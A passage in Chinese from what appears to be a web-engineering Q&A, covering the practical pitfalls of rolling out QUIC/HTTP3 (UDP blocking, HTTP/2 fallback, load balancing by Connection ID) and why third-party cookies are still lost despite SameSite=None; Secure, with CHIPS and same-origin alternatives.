答：① 网络可达性：QUIC 走 UDP 443，部分企业网络与运营商会限速或直接封 UDP，所以必须保留 HTTP/2 回退——服务端用 `Alt-Svc` 通告，浏览器探测失败自动回落，灰度一般按地域/运营商放量。② 可观测性：QUIC 把传输层元数据加密了，传统抓包与中间设备看到的信息变少，排查要靠 qlog 与应用层埋点。③ 负载均衡：连接迁移靠 Connection ID，四层 LB 必须能按 CID 路由，否则客户端切网后会被打到别的节点、会话直接失效。④ 协议栈与证书链：TLS 1.3 是强制的，老客户端、老旧中间盒的兼容性要单独验证。

**Q：`SameSite=None; Secure` 都配了，为什么第三方场景的 Cookie 还是会丢？**

答：因为这已经不是 SameSite 的问题，而是浏览器在**整体收紧第三方 Cookie**：Chrome 的第三方 Cookie 限制、Safari ITP 默认拦截跨站 Cookie、Firefox 的总量与时效限制，逐条都能让你的会话失效。即使放行，`SameSite=None` 也必须同时带 `Secure` 且全程 HTTPS，否则直接被丢弃；iframe 里还需要 `Partitioned`（CHIPS）按顶层站点隔离存储。工程结论：跨站会话别硬扛第三方 Cookie，改成「顶层跳转 + 一次性 code 换票」（OAuth 那套），或者干脆让前后端同源、走反向代理消掉跨域。
